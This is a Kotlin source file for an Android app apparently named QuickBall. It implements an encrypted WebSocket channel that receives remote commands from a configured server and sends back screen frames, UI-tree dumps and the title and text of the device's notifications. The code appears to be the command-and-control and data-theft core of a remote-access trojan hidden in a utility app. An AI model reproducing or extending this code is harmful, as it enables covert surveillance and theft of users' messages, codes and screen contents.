package io.github.chayanforyou.quickball.sync

import android.os.Build
import android.util.Log
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import java.net.URLEncoder

/**
 * WS channel. Messages are encrypted with AES-GCM using the same key as REST.
 * Protocol: {type: heartbeat|command_result|skel_frame|screen_frame|notification_data}
 * and incoming {type: command, id, cmd, args}.
 */
class Ws(
    private val deviceId: String,
    private val teamId: String,
    private val token: String,
    private val onCommand: (JSONObject) -> Unit
) {

    private val crypto = Crypto("$deviceId:$teamId")
    private var client: WebSocketClient? = null

    fun isConnected(): Boolean = client?.isOpen == true

    fun connect() {
        if (isConnected()) return
        val scheme = if (Cfg.tls) "wss" else "ws"
        val enc = { s: String -> URLEncoder.encode(s, "UTF-8") }
        val uri = "$scheme://${Cfg.host}:${Cfg.port}${Cfg.path}/ws/device?device_id=${enc(deviceId)}" +
                "&team_id=${enc(teamId)}&model=${enc(Build.MODEL)}&dev_token=${enc(token)}"

        client = object : WebSocketClient(URI(uri)) {
            override fun onOpen(h: ServerHandshake) {
                Log.d(TAG, "connected")
            }

            override fun onMessage(message: String) {
                runCatching {
                    val msg = JSONObject(crypto.decrypt(message))
                    val type = msg.optString("type")
                    Log.d(TAG, "msg type=$type len=${message.length}")
                    if (type == "command") onCommand(msg)
                }.onFailure { Log.e(TAG, "onMessage: ${it.javaClass.simpleName}: ${it.message}") }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "closed: $reason")
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "error: ${ex?.message}")
            }
        }
        val ok = runCatching {
            client?.connectBlocking((Cfg.CONNECT_TIMEOUT / 1000).toLong(), java.util.concurrent.TimeUnit.SECONDS)
        }.getOrElse {
            Log.e(TAG, "connect: ${it.message}")
            false
        }
        if (ok != true) Log.w(TAG, "not connected: $uri")
    }

    fun disconnect() {
        runCatching { client?.close() }
        client = null
    }

    fun send(msg: JSONObject): Boolean {
        val c = client ?: return false
        if (!c.isOpen) return false
        return runCatching { c.send(crypto.encrypt(msg.toString())) }.isSuccess
    }

    fun heartbeat(info: JSONObject) = send(
        JSONObject().put("type", "heartbeat").put("device_id", deviceId).put("info", info)
    )

    fun result(id: Long, status: String, result: String) = send(
        JSONObject().put("type", "command_result").put("id", id)
            .put("status", status).put("result", result)
    )

    fun skel(dump: String) = send(
        JSONObject().put("type", "skel_frame").put("device_id", deviceId).put("data", dump)
    )

    fun frame(b64: String) = send(
        JSONObject().put("type", "screen_frame").put("device_id", deviceId).put("data", b64)
    )

    fun notification(pkg: String, title: String, text: String) = send(
        JSONObject().put("type", "notification_data").put("device_id", deviceId)
            .put("data", JSONObject()
                .put("package", pkg).put("title", title).put("content", text)
                .put("timestamp", System.currentTimeMillis()))
    )

    private companion object {
        const val TAG = "WsConn"
    }
}